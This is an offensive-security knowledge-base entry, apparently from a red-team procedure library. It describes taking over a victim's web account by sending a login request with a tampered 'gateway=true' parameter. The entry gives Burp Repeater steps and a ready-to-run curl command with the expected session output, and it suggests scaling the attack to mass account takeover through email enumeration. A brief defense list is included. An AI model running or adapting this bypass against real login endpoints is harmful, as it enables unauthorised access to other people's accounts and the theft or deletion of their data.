---
id: proc-send-modified-request-001
name: Send Modified Login Request for Account Impersonation
tags:
  - impersonation
  - request-forward
  - exploitation
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-auth-bypass-login]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:31:52.682Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Send Modified Login Request for Account Impersonation

## Summary

This procedure involves forwarding the parameter-tampered login request to the server, resulting in successful authentication as the victim user without valid credentials, achieving full account takeover.

## Description

After modification, sending the request exploits the backend logic that trusts the 'gateway=true' flag to skip verification. The server responds with a 200 OK and victim session tokens, granting access to sensitive actions like deletions or data exports. Tested on the reported endpoint behind nginx; scalable to mass takeover by scripting email enumeration.

## Requirements

1. Modified request prepared in Burp Repeater
2. Target server online and accessible
3. Optional: List of target emails for enumeration

## Defense

Defensive measures and detection strategies:

- Audit logs for login requests with gateway=true
- Multi-factor authentication (MFA) to block bypasses
- Anomaly detection on login success rates per IP

## Objectives

1. Trigger server-side bypass with tampered params
2. Obtain valid session for victim account
3. Confirm no password requirement

## Instructions

### Step 1: Forward from Burp

**Context**: Send the altered request to the endpoint.

In Burp Repeater, click 'Send' or 'Go'.

> Observe the response in the Inspector tab.

### Step 2: Alternative with Curl

**Context**: For scripting or non-proxy testing, use curl to replicate.

**Command** ([[commands/curl-auth-bypass-login]]):
```bash
curl -X POST https://████████/app/login -H "Content-Type: application/json" -d '{"updates":[{"param":"userEmail","value":"victim@example.com"},{"param":"gateway","value":true}]}' -c cookies.txt -v
```

> The -c flag saves session cookies; expect 200 OK with victim details like {"id":123,"name":"Victim User","type":"standard"}.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques


## Commands Used

- [[commands/curl-auth-bypass-login]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[impersonation]]
- [[exploitation]]
